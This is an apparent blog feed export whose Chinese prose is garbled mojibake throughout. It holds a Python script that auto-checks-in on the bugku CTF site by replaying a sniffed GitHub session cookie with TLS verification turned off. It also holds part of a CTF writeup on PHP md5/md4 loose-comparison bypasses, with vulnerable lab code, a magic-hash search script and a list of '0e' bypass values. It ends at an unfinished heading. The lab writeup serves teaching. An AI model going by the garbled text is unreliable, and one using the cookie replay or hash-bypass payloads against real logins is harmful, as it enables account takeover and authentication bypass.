<p>å“ˆå“ˆï¼Œé¦–å…ˆå†™è‡ªåŠ¨ç­¾åˆ°è„šæœ¬çš„åˆè¡·è¿˜æ˜¯å› ä¸ºç­¾åˆ°æœ‰é‡‘å¸å¯ä»¥æ‹¿ã€‚ä¸€å¼€å§‹æƒ³æ³•æ˜¯ç”¨å·ç§¯ç¥ç»ç½‘ç»œè®­ç»ƒæ¨¡å‹ï¼Œç„¶åè¯†åˆ«ç™»å½•é¡µé¢çš„éªŒè¯ç ï¼Œä½†æ˜¯å½“æˆ‘çˆ¬å–äº†1000å¼ éªŒè¯ç åï¼Œåœ¨æ ‡è®°ä¸Šé¢èŠ±äº†æˆ‘æ•´æ•´ä¸€ä¸ªæ—©ä¸Šå’Œä¸€ä¸ªä¸‹åˆçš„æ—¶é—´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/YA%25G4S9~O%5DES3FHO2%7DK95XT.png" alt=""><br>
ç„¶åç»“æœæ˜¯è®­ç»ƒå‡ºæ¥çš„æ¨¡å‹å¯¹äºè®­ç»ƒé›†è¯†åˆ«ç™¾åˆ†ç™¾ï¼Œä½†å¯¹äºæµ‹è¯•é›†è¯†åˆ«ç‡ä¸å°½äººæ„ï¼ŒçŒœæƒ³å¯èƒ½æ˜¯æ•°å­—åŠ å¤§å°å†™å­—æ¯çš„ç»„åˆéœ€è¦æ›´å¤šçš„è®­ç»ƒé›†ï¼Œä½†æ˜¯ä¸€æƒ³åˆ°åˆè¦èŠ±è´¹å¤§é‡æ—¶é—´æ ‡è®°ï¼Œå°±æ„Ÿè§‰æ•´ä¸ªäººéƒ½ä¸å¥½äº†ğŸ˜­ï¼Œæ­£å¥½æœ‰äººè¯´é‡‡å–githubç™»å½•çš„æ€è·¯ï¼Œå°±æƒ³ç€å…ˆç”¨githubæ¥å®ç°å§æƒ¨æƒ¨</p>
<h2 id="æ­£æ–‡"><a class="header-anchor" href="#æ­£æ–‡">Â¶</a>æ­£æ–‡</h2>
<p>æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡githubçš„cookieå»è¯·æ±‚ç™»å½•ï¼Œç™»å½•æˆåŠŸåï¼Œé€šè¿‡requestsä¿æŒsessionä¼šè¯å»è¯·æ±‚æ‰“å¡åœ°å€<br>
ä½¿ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š<br>
é¦–å…ˆéœ€è¦githubçš„cookieï¼ˆæœ‰æ•ˆæ—¶é—´é•¿å¾—è®©ä½ éš¾ä»¥ç½®ä¿¡ï¼Œç°åœ¨æ˜¯ç”¨äº†ä¸€ä¸ªæœˆè¿˜æ²¡å¤±æ•ˆçš„åšä¸»å›æ¥æ›´æ–°è¿™ç¯‡æ–‡ç« ï¼‰ï¼Œè¿™è¾¹å»æŠ“åŒ…ä¸€ä¸‹æ‹¿åˆ°<code>user_session</code>å’Œ<code>__Host-user_session_same_site</code>è¿™ä¸¤ä¸ªå€¼æ˜¯ä¸€æ ·çš„<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/%28%24P_B8AT%295P%5D2E0N_%7D%5B%7BG90.png" alt=""><br>
ç„¶åå»æ³¨å†Œä¸€ä¸‹serveré…±ï¼Œç»‘å®šä½ çš„å¾®ä¿¡ã€‚ç„¶åé€šè¿‡è°ƒç”¨serveré…±ï¼ŒæŠŠæ‰“å¡ç»“æœå‘é€åˆ°å¾®ä¿¡ä¸Š<br>
åœ°å€ï¼š<a href="https://sc.ftqq.com/3.version">https://sc.ftqq.com/3.version</a><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/NF%7B%24FT4O%5BCGI3R%29P7%5D%5DPA%25U.png" alt=""></p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"># Date ï¼š2021/1/21 17:43</span></span><br><span class="line"><span class="comment"># Tool ï¼šPyCharm</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request <span class="keyword">as</span> RR</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"><span class="comment">#å®šä¹‰é€šç”¨çš„è¯·æ±‚å¤´</span></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯»å–txté…ç½®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_txt</span>():</span></span><br><span class="line">    user_list = []</span><br><span class="line">    server_list = []</span><br><span class="line">    git_list = []</span><br><span class="line">    f = open(<span class="string">r&#x27;é…ç½®.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> data[i] != <span class="string">r&#x27;******author:dota_st******&#x27;</span>:</span><br><span class="line">            user_line = data[i].split(<span class="string">r&quot;user=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            server_line = data[i].split(<span class="string">r&quot;server_key=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            git_line = data[i].split(<span class="string">r&quot;git_cookie=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            user_list.append(user_line)</span><br><span class="line">            server_list.append(server_line)</span><br><span class="line">            git_list.append(git_line)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> user_list, server_list, git_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä½¿ç”¨serveré…±å‘é€æ¶ˆæ¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_send</span>(<span class="params">user_line, server_line, message</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;desp&#x27;</span>: message&#125;</span><br><span class="line">    server_key = server_line</span><br><span class="line">    requests.post(<span class="string">&quot;https://sc.ftqq.com/&quot;</span>+server_key+<span class="string">&quot;.send?text=å°Šè´µçš„&quot;</span>+user_line+<span class="string">&quot;ç”¨æˆ·bugkuè‡ªåŠ¨ç­¾åˆ°è„šæœ¬ç»“æœ&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–ç­¾åˆ°ç»“æœè¿”å›ä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_result</span>(<span class="params">user_line, server_line, bug_cookie</span>):</span></span><br><span class="line">    <span class="keyword">global</span> headers</span><br><span class="line">    headers[<span class="string">&#x27;X-Requested-With&#x27;</span>] = <span class="string">&quot;XMLHttpRequest&quot;</span></span><br><span class="line">    headers[<span class="string">&#x27;cookie&#x27;</span>] = bug_cookie</span><br><span class="line">    req = RR.Request(url=<span class="string">&#x27;https://ctf.bugku.com/user/checkin&#x27;</span>, headers=headers)  <span class="comment"># è¿™æ ·å°±èƒ½æŠŠå‚æ•°å¸¦è¿‡å»äº†</span></span><br><span class="line">    <span class="comment"># ä¸‹é¢æ˜¯è·å¾—å“åº”</span></span><br><span class="line">    <span class="keyword">with</span> RR.urlopen(req) <span class="keyword">as</span> f:</span><br><span class="line">        Data = f.read()</span><br><span class="line">        data = json.loads(Data)</span><br><span class="line">        print(data[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        server_send(user_line, server_line, data[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line"><span class="comment">#ç™»å½•åˆ¤æ–­</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_status</span>(<span class="params">user_line, server_line,res</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        print(<span class="string">&quot;cookieæå–æˆåŠŸ!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;PHPSESSID&#x27;</span> <span class="keyword">in</span> i):</span><br><span class="line">                login_result(user_line, server_line, i.strip())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸»å‡½æ•°</span></span><br><span class="line"><span class="meta">@retry(stop_max_attempt_number=3)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_fun</span>(<span class="params">user_line, server_line, git_line</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    keep = requests.Session()</span><br><span class="line">    div = BeautifulSoup(keep.get(<span class="string">&quot;https://ctf.bugku.com/login&quot;</span>.rstrip(), headers=headers, verify=<span class="literal">False</span>).text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    git_url = div.find(<span class="string">&#x27;a&#x27;</span>, class_=<span class="string">&#x27;btn btn-floating btn-github&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    git_cookie = <span class="string">&#x27;user_session=&#123;git_line1&#125;; __Host-user_session_same_site=&#123;git_line2&#125;;&#x27;</span>.format(git_line1=git_line, git_line2=git_line )</span><br><span class="line">    headers[<span class="string">&#x27;cookie&#x27;</span>] = git_cookie</span><br><span class="line">    flag = keep.get(<span class="string">&quot;https://github.com/settings/profile&quot;</span>, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span>(flag.status_code!= <span class="number">200</span>):</span><br><span class="line">        server_send(user_line, server_line, <span class="string">&quot;githubçš„cookieå¤±æ•ˆäº†å™¢ï¼&quot;</span>)</span><br><span class="line">    res = keep.get(git_url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    login_status(user_line,server_line, res)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;github.githubassets.com&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        print(res.text)</span><br><span class="line">        choose = res.text.split(<span class="string">&#x27;&lt;form action=&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;scope&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        rule = re.compile(<span class="string">&#x27;name=&quot;(.*?)&quot;.*?value=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">        form_data = rule.findall(choose)</span><br><span class="line">        Data = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> form_data:</span><br><span class="line">            Data[i[<span class="number">0</span>]] = i[<span class="number">1</span>]</span><br><span class="line">        Data[<span class="string">&#x27;authorize&#x27;</span>] = <span class="number">1</span></span><br><span class="line">        formurl = <span class="string">&quot;https://github.com&quot;</span> + choose.split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cookie&quot;</span>: git_url</span><br><span class="line">        &#125;</span><br><span class="line">        res = keep.post(formurl, data=Data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        login_status(user_line,server_line, res)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text):</span><br><span class="line">        server_send(user_line, server_line, <span class="string">&quot;è¶…æ—¶é”™è¯¯&quot;</span>)</span><br><span class="line">    keep.cookies.clear()</span><br><span class="line">    keep.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    user_list, server_list, git_list = load_txt()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(user_list)):</span><br><span class="line">        main_fun(user_list[i], server_list[i], git_list[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨è„šæœ¬åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼šé…ç½®.txtï¼Œç„¶åæŒ‰ä¸‹é¢æ ¼å¼åˆ†åˆ«å†™å…¥ï¼ˆæ”¯æŒå†™å…¥å¤šä¸ªç”¨æˆ·ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;ä½ çš„ç”¨æˆ·å# server_key&#x3D;å¡«å†™ä½ çš„serveré…±# git_cookie&#x3D;å¡«å†™æŠ“åŒ…è·å¾—çš„githubcookie#</span><br><span class="line">******author:dota_st******</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/QLT33%29NA~Z9%28E%24%5D597V6Y%5B9.png" alt=""><br>
æœ€åæˆ‘æ‰“åŒ…æˆexeæ–‡ä»¶ï¼Œå‘åˆ°æˆ‘çš„æœåŠ¡å™¨ä¸Šï¼ˆæ²¡æœ‰æœåŠ¡å™¨çš„ä¹Ÿå¯ä»¥æ‰¾ä¸€ä¸‹æä¾›äº‘å‡½æ•°çš„åœ¨çº¿å¹³å°ï¼‰ï¼Œè®¾ç½®è®¡åˆ’ä»»åŠ¡ï¼Œæ¯å¤©å›ºå®šæ—¶é—´å¯åŠ¨ï¼Œæœ€å¥½è®¾ç½®å¯åŠ¨ä¸¤æ¬¡ï¼Œè™½ç„¶è„šæœ¬å·²ç»å°½å¯èƒ½åœ¨é”™è¯¯æ—¶é‡è¯•ï¼Œä½†å› ä¸ºgithubè¿™è¾¹é€šé“ä¸æ˜¯å¾ˆç¨³å®šï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°å¤±è´¥çš„æƒ…å†µ(è™½ç„¶æ¦‚ç‡æå°)<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/9%244%25S64%404MD%24%40PLXQYMYV_Q.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210126165907.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>ç¨‹åº</tag>
      </tags>
  </entry>
  <entry>
    <title>php-md5ç±»å‹é¢˜ç›®æ±‡æ€»</title>
    <url>/posts/16813/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<p>æœ€è¿‘æœ‰ä¸€äº›å°ä¼™ä¼´é‡åˆ°md5ç±»å‹é¢˜ç›®æ±‚è§£ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—æ”¶é›†ä¸€äº›ç›¸å…³é¢˜ç›®åšæˆä¸€ä¸ªå°é¶åœºåˆ†äº«ç»™å„ä½å¸ˆå‚…æ¥ç©ç©ï¼Œå¹¶ä¸”è‡ªå·±åŠ¨æ‰‹ä¹Ÿæ˜¯ååˆ†æœ‰è¶£çš„ä¸€ä»¶äº‹æƒ…ï¼Œå¦‚æœå¯¹å„ä½å¸ˆå‚…æœ‰ç”¨çš„è¯åœ¨githubä¸Šç»™æœ¬èŒæ–°ç‚¹ä¸€ä¸‹starå“Ÿâ¤ï¸<br>
é¶åœºåœ°å€ï¼š<code>https://github.com/dota-st/md5bypass</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/B%5B%60EVIR%600%28Y0NH_PR%5B%24%284PL.png" alt=""></p>
<h1>writeup</h1>
<h2 id="é¢„å¤‡æŠ€èƒ½"><a class="header-anchor" href="#é¢„å¤‡æŠ€èƒ½">Â¶</a>é¢„å¤‡æŠ€èƒ½</h2>
<h3 id="å¼±ç±»å‹æ¯”è¾ƒ"><a class="header-anchor" href="#å¼±ç±»å‹æ¯”è¾ƒ">Â¶</a>å¼±ç±»å‹æ¯”è¾ƒ</h3>
<p>å¼±ç±»å‹æ¯”è¾ƒï¼Œä¹Ÿå«æ¾æ•£æ¯”è¾ƒã€‚å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œä¼šæŠŠå­—ç¬¦ä¸²å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—(å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æœ‰æ•°å­—ï¼Œåˆ™è½¬æ¢ä¸ºå¼€å¤´æ•°å­—ï¼Œæ²¡æœ‰åˆ™è½¬æ¢ä¸º0)</p>
<blockquote>
<p><code>==</code>ï¼šåªæ¯”è¾ƒæ•°æ®å€¼â€”â€”&gt;æ•°æ®å€¼ç›¸åŒï¼Œä¸æ¯”è¾ƒæ•°æ®ç±»å‹<br>
<code>!=</code>:  åªæ¯”è¾ƒæ•°æ®å€¼â€”â€”&gt;æ•°æ®å€¼ä¸åŒ</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/UN%7BOK%25%5BV_%24%7BT%40%24GE2%29TJ~V8.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="number">123</span>==<span class="string">&quot;123a&quot;</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line">var_dump(<span class="number">123</span>==<span class="string">&quot;1234a&quot;</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line">var_dump(<span class="number">0</span>==<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br></pre></td></tr></table></figure>
<h3 id="å¼ºç±»å‹æ¯”è¾ƒ"><a class="header-anchor" href="#å¼ºç±»å‹æ¯”è¾ƒ">Â¶</a>å¼ºç±»å‹æ¯”è¾ƒ</h3>
<p>å¼ºç±»å‹æ¯”è¾ƒï¼Œä¹Ÿå«ä¸¥æ ¼æ¯”è¾ƒã€‚ä¸ä»…è¦æ¯”è¾ƒæ•°æ®çš„å€¼ä¹Ÿè¦æ¯”è¾ƒæ•°æ®çš„ç±»å‹ï¼Œä¾‹å¦‚strå’Œintä¸¤ç§æ•°æ®ç±»å‹å°±ä¸ä¼šç›¸ç­‰</p>
<blockquote>
<p><code>===</code>ï¼šæ¯”è¾ƒæ•°æ®ç±»å‹â€”â€”&gt;æ•°æ®ç±»å‹ç›¸åŒ  &amp;&amp; æ¯”è¾ƒæ•°æ®å€¼â€”â€”&gt;æ•°æ®å€¼ç›¸åŒ<br>
<code>!==</code>ï¼šæ¯”è¾ƒæ•°æ®ç±»å‹â€”â€”&gt;æ•°æ®ç±»å‹ä¸åŒ   ||   æ¯”è¾ƒæ•°æ®å€¼â€”â€”&gt;æ•°æ®å€¼ä¸åŒ</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/%28DMD1IEX62E70~R%606F28BKJ.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="number">123</span>===<span class="string">&quot;123a&quot;</span>);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line">var_dump(<span class="number">123</span>===<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line">var_dump(<span class="number">123</span>===<span class="number">123</span>);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br></pre></td></tr></table></figure>
<h2 id="pass1"><a class="header-anchor" href="#pass1">Â¶</a>pass1</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-01.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&quot;pass&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fail~~~&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-02.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the pass&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è€ƒç‚¹æ˜¯md4å¼±ç±»å‹ï¼Œæ³¨æ„è§‚å¯Ÿï¼Œifåˆ¤æ–­ä¸­æ˜¯ç”¨çš„<code>!=</code>ä¹Ÿå°±æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•0e(éœ€è¦çº¯æ•°å­—)è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬å¾—åˆ°ä¸€ä¸ªmd4åŠ å¯†å‰å’Œmd4åŠ å¯†åéƒ½ä¸ºçº¯æ•°å­—çš„ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„å­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * User: dota_st</span></span><br><span class="line"><span class="comment"> * Date: 2021/2/5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; ; $i++) &#123;</span><br><span class="line">    $r = <span class="string">&quot;0e&quot;</span> . $i;</span><br><span class="line">    $md4 = hash(<span class="string">&quot;md4&quot;</span>, $r);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^0e[0-9]*$/&quot;</span>, $md4)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md4åŠ å¯†å‰:&quot;</span>.$r).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;md4åŠ å¯†åï¼š&quot;</span>.$md4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°ç»“æœ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass1/%60N%60KY%5B5%5DID_O_FIS489E1%7DB.png" alt=""></p>
<table>
<thead>
<tr>
<th style="text-align:center">md4åŠ å¯†å‰</th>
<th style="text-align:center">md4åŠ å¯†å</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0e251288019</td>
<td style="text-align:center">0e874956163641961271069404332409</td>
</tr>
</tbody>
</table>
<p>æˆåŠŸç»•è¿‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass1/L1NZO%287J_9%7BFAM6BT9Z%29F%403.png" alt=""></p>
<h2 id="pass2"><a class="header-anchor" href="#pass2">Â¶</a>pass2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-02.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) == md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-03.php&#x27;&gt;ä¸‹ä¸€å…³&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è€ƒç‚¹æ˜¯md5å¼±ç±»å‹æ¯”è¾ƒï¼Œæ³¨æ„çœ‹åˆ°<code>==</code>ç¬¦å·ï¼Œå…³äºmd5å‡½æ•°çš„å¼±æ¯”è¾ƒï¼Œæœ‰å¤šç§ç»•è¿‡æ‰‹æ³•</p>
<p><strong>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</strong><br>
åˆ—ä¸¾å‡ ç§è„šæœ¬çˆ†ç ´å‡ºçš„ç±»å‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IHKFRNS 0e256160682445802696926137988570</span><br><span class="line">QLTHNDT 0e405967825401955372549139051580</span><br><span class="line">QNKCDZO 0e830400451993494058024219903391</span><br><span class="line">3908336290 0e807624498959190415881248245271</span><br><span class="line">4011627063 0e485805687034439905938362701775</span><br><span class="line">4775635065 0e998212089946640967599450361168</span><br><span class="line">0e215962017 0e291242476940776845150308577824</span><br><span class="line">aabg7XSs 0e087386482136013740957780965295</span><br><span class="line">aabC9RqS 0e041022518165728065344349536299</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass2/S%7B~%7DM6%5B5AIR%7BBM%5D%60UMH%7B5%28A.png" alt=""><br>
<strong>æ•°ç»„ç»•è¿‡</strong><br>
